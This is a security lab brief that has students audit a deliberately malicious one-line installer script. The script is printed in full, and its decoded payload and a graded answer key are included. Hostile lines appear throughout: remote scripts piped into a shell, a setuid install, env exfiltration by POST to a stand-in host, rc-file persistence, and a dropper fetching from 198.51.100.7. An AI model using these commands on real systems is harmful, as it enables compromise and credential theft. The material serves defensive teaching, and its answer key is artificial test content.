## BRIEF
**Phase gate.** `setup.sh` is a realistic malicious installer — the kind of
script that shows up as a README's "one-line install" and chains together
every footgun this phase covered: an untrusted search path, a predictable
temp file, a chained remote-script-into-shell, an unexplained privilege
escalation, a plain-HTTP binary, an argument-injection-vulnerable extraction,
an obfuscated payload, rc-file persistence, and environment exfiltration.
You never run this script, not even fenced — this is pure reading, decoding,
and IOC extraction, exactly like L4.2 and L4.5. Map every finding to a line,
decode the blob to a file, pull the indicator of compromise, and render your
verdict.

## GUIDED STEPS

1. Read the whole script before touching anything else:

       cat -n setup.sh

   ```sh
    1  #!/bin/sh
    2  # TEACHING SAMPLE — intentionally flawed (malicious installer). Do NOT run. Audit it.
    3  set -e
    4  BASE="https://get.acme-updates.test"
    5  PATH=.:$PATH
    6  TMP=/tmp/acme.$$
    7
    8  curl -fsSL "$BASE/bootstrap.sh" | sh
    9  sudo install -m4755 agent /usr/local/bin/acme
   10
   11  curl -fsSL "http://cdn.acme-updates.test/agent" -o "$TMP"
   12  name=$1
   13  tar -xf bundle.tar "$name"
   14
   15  blob="$(cat payload.b64)"
   16  eval "$(printf '%s' "$blob" | base64 -d)"
   17  echo "$BASE/agent.sh | sh" >> "$HOME/.profile"
   18  curl -X POST --data "$(env)" "$BASE/enroll"
   ```

2. Find each finding, one per line — every one is a lesson from earlier
   this phase, chained together:

   - **Line 5 — untrusted search path (L4.4).** `PATH=.:$PATH` puts the
     current directory first. If this installer's working directory is
     ever attacker-writable, a dropped `curl` or `tar` runs instead of the
     real one.
   - **Line 6 — predictable temp file (L4.7).** `TMP=/tmp/acme.$$` — a
     name built from nothing but the process id, in a directory everyone
     can write to.
   - **Line 8 — remote-exec, unread (L4.2).** A *second* remote script,
     chained straight into a shell. You never see its contents before it
     runs.
   - **Line 9 — unexplained privilege (L4.2).** `sudo` claims root to
     install a **setuid** binary — persistent privileged code, dropped
     with no justification.
   - **Line 11 — plain-HTTP binary (L4.2).** No TLS. Anyone on the network
     path can swap this binary for their own before it's ever run.
   - **Line 13 — argument injection (L4.3).** `$name` reaches an
     extraction command with no `--` end-of-options guard. A value like
     `--to-command=<anything>` isn't read as a filename to extract — GNU
     `tar` runs it as a real option, executing arbitrary commands during
     extraction.
   - **Line 16 — obfuscation (L4.5).** A base64 blob, decoded and handed
     straight to a re-parsing builtin, unseen. No legitimate installer
     needs to hide its own commands from you.
   - **Line 17 — persistence (L4.2).** Writes itself into a shell rc file,
     so it re-runs on every new shell — long after the install "finished."
   - **Line 18 — exfiltration (L4.2/L4.5).** Posts the entire environment
     — every token, every credential you have exported — to a remote
     endpoint.

3. Decode the obfuscated blob — **to a file, never through a pipe into any
   shell**, exactly like L4.5:

       base64 -d payload.b64 > decoded.txt
       cat decoded.txt

   captured output:

       mkdir -p "$HOME/.acme" && curl -fsSL http://198.51.100.7/x -o "$HOME/.acme/x" && (sh "$HOME/.acme/x" &)

   Downloads a second-stage payload to a hidden `.acme` directory in the
   user's home, then launches it in the background — a second dropper
   nested inside the first.

4. Extract the indicator of compromise — the hardcoded address the
   decoded payload downloads from: `198.51.100.7`.

5. Render your verdict. Write `answers.txt`:

       verdict=unsafe
       search_path=5
       predictable_temp=6
       remote_exec=8
       privilege=9
       http_binary=11
       arg_injection=13
       obfuscation=16
       persistence=17
       exfil=18
       c2=198.51.100.7

6. `lab check bash L4.8`
